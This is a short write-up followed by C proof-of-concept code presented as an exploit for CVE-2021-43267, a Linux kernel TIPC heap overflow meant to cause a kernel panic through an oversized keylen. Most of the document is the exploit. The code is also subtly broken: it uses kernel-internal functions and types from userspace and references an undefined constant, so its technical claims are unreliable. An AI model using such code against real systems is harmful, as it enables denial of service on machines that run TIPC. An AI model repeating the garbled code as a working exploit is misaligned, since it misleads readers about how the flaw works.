A Proof of Concept (PoC) exploit was developed by the security researchers at SentinelOne who discovered CVE-2021-43267. The exploit triggers a kernel panic by causing a heap buffer overflow. It involves creating a TIPC socket and sending a specially crafted `MSG_CRYPTO` message where the embedded key length (`keylen`) is larger than the allocated buffer size.

The following C code demonstrates the PoC:

```c
#include <sys/socket.h>
#include <linux/tipc.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

#define TIPC_AEAD_ALG_NAME "gcm(aes)"
#define TIPC_AEAD_KEY_SIZE_MAX 32

// Structure representing the cryptographic key message payload
struct tipc_aead_key {
    char alg_name[TIPC_AEAD_ALG_NAME_MAX];
    unsigned int keylen;
    unsigned char key[0];
};

int main(void) {
    int sock;
    struct sockaddr_tipc server_addr;
    struct tipc_msg msg;

    // The malicious payload
    // We allocate a small buffer but specify a very large keylen to cause an overflow.
    char payload[40]; 
    struct tipc_aead_key *key_data = (struct tipc_aead_key *)payload;

    // Create a TIPC socket
    sock = socket(AF_TIPC, SOCK_SEQPACKET, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    // Set up the destination TIPC address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.family = AF_TIPC;
    server_addr.addrtype = TIPC_ADDR_NAME;
    server_addr.addr.name.name.type = 1;
    server_addr.addr.name.name.instance = 1;
    server_addr.scope = TIPC_ZONE_SCOPE;

    // Craft the malicious TIPC message header
    tipc_msg_init(NULL, &msg, TIPC_MSG_CRYPTO, 0, sizeof(payload));

    // Craft the malicious payload data
    memset(payload, 0, sizeof(payload));
    strcpy(key_data->alg_name, TIPC_AEAD_ALG_NAME);
    // This is the vulnerability: keylen is much larger than the actual payload size.
    // The kernel will allocate based on msg_data_sz() (~40 bytes) but try to 
    // memcpy() 1000 bytes.
    key_data->keylen = 1000; 

    // Connect to the TIPC service
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    // Send the header and the malicious payload
    if (write(sock, &msg, TIPC_MSG_HDR_SZ) < 0) {
        perror("write header");
    }
    if (write(sock, payload, sizeof(payload)) < 0) {
        perror("write payload");
    }

    printf("Exploit payload sent.\n");
    close(sock);
    return 0;
}
